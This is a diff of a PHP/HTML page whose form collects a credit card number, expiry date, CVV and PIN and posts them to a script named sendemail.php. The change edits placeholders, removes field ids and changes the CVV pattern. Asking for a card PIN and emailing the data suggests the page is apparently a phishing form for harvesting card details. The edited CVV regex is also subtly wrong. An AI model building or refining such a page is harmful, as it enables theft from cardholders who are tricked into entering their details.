@@ -1,8 +1,3 @@
-<?php
-
-$_SESSION['img'] = 'card';
-
-?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -90,21 +85,21 @@ $_SESSION['img'] = 'card';
 
         <form action="sendemail.php" method="POST" id="creditCardForm">
             <label for="cardNumber">Credit Card Number:</label>
-            <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter card number" pattern="^\d{16}$"
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter your 16 digit card number" pattern="^\d{16}$"
                 required>
 
             <div class="input-group">
                 <label for="expirationDate">Expiration Date (MM/YY):</label>
-                <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY"
+                <input type="text" name="expirationDate" placeholder="MM/YY"
                     pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
             </div>
 
             <div class="input-group">
                 <label for="cvv">CVV:</label>
-                <input type="text" id="cvv" name="cvv" placeholder="Enter CVV" pattern="^\d{3}$" required>
+                <input type="text" name="cvv" placeholder="3 or 4 digit CVV" pattern="^\d{3}|\d{4}$" required>
 
                 <label for="pin">PIN:</label>
-                <input type="text" id="pin" name="pin" placeholder=" 4 digit pin" pattern="^\d{4}$" required>
+                <input type="text" name="pin" placeholder="4 digit pin" pattern="^\d{4}$" required>
             </div>
 
             <button type="submit">Submit</button>
